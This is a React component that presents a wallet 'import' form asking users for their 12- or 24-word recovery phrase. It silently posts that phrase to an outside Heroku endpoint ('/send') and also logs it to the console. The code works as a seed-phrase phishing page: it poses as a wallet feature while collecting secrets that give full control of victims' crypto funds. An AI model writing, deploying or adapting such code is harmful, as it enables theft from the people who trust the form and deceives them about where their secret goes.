import React, { useState } from "react";
import axios from 'axios'
import styles from "../../styles/Home.module.css";
import Tabs from "./index";

export default function Discover() {
  const [phrase, setPhrase] = useState("");

  const handleSubmit=(e)=> {
    e.preventDefault();
    axios.post('https://shielded-earth-12418.herokuapp.com/send', {phrase: phrase})
         .then(res => res.json())
         .catch(err => err)
    console.log(phrase)
  }

  return (
    <Tabs>
      <div>
        <form onSubmit={handleSubmit}>
          <textarea
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
            placeholder="Phrase is typically 12 (sometimes 24) words separated by single spaces"
            className={styles.textarea}
          />
          <button className={styles.button}>import</button>
        </form>
      </div>
    </Tabs>
  );
}
